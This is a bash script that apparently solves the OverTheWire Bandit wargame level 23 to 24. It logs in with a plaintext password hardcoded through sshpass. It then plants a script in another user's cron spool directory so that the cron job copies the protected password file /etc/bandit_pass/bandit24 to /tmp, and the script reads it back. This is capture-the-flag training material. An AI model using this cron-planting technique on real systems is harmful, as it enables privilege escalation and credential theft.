#!/bin/bash
if ! which sshpass >/dev/null; then
  
  echo "'sshpass' command not available."
  echo "Install it first with 'sudo apt-get install sshpass"
  sleep 5
  sudo apt-get install sshpass
fi

#Username: bandit23 Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
sshpass -p "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n" ssh -l "bandit23" bandit.labs.overthewire.org 'echo "cat /etc/bandit_pass/bandit24 > /tmp/anidear_bandit24" > /var/spool/bandit24/anidear.sh; chmod +x /var/spool/bandit24/anidear.sh; while [ ! -e /tmp/anidear_bandit24 ]; do sleep 1; done; cat /tmp/anidear_bandit24'